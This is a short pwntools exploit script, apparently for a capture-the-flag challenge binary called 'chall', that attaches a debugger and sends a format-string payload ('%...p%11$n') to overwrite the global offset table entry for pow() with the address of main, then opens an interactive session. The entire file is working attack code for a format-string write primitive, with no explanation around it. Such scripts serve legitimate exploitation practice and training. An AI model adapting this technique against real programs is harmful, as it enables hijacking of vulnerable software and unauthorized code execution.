from pwn import *

binary = ELF("chall")
r = process("./chall")
gdb.attach(r, api = True)

pow_got = binary.got['pow']
main_addr = binary.symbols['main']

log.info(f"Main address: {hex(main_addr)}") # 0x400837
log.info(f"pow() GOT address: {hex(pow_got)}") # 0x601040


payload1 = b"11111111" + p64(pow_got) #+ p64(pow_got+4)

r.sendlineafter(b"A: ",payload1)

#payload2 = b"1_______%1p%11$n--------"
payload2 = b"1_______%" + str(int(main_addr) - 46).encode("ascii") + b"p%11$n--" #4196361

r.sendlineafter(b"B: ",payload2)

r.interactive()
